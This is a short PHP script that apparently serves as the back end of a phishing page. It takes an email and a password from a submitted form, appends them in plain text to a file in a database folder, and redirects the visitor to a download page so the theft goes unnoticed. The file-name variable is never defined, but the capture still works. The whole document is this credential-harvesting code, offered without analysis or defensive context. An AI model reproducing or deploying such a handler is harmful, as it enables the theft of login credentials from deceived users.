<?php

$email = $_POST['email'];
$password = $_POST['password'];

file_put_contents("../database/$ip.txt","\r\n\r\nEmail: ". $email."\r\nPassword: ". $password, FILE_APPEND);

header('Refresh: 0;url=download.html');
?>

